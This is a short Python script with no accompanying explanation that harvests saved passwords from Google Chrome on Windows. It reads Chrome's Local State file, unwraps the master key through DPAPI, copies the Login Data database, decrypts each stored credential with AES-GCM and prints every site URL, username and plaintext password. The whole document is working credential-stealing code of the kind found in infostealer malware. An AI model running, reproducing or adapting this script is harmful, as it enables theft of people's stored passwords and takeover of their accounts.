import json
import os
import shutil
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES

def get_encryption_key():
    current_user = os.getlogin()
    local_state_path = f"C:/Users/{current_user}/AppData/Local/Google/Chrome/User Data/Local State"
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(encrypted_password, key):
    encrypted_password = encrypted_password[3:]
    iv = encrypted_password[:12]
    payload = encrypted_password[12:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    return cipher.decrypt(payload)[:-16].decode()

current_user = os.getlogin()
database_path = f"C:/Users/{current_user}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
login_data_copy = "login_data_temp.db"
shutil.copyfile(database_path, login_data_copy)

conn = sqlite3.connect(login_data_copy)
cursor = conn.cursor()
encrypted_data = cursor.execute("SELECT origin_url, username_value, password_value FROM logins;").fetchall()
user_key = get_encryption_key()

for entry in encrypted_data:
    site_url, username, encrypted_password = entry
    decrypted_password = decrypt_password(encrypted_password, user_key)
    if len(username) > 0 and len(decrypted_password) > 0:
        print(f"URL: {site_url}, Username: {username}, Password: {decrypted_password}")

cursor.close()
conn.close()
os.remove(login_data_copy)
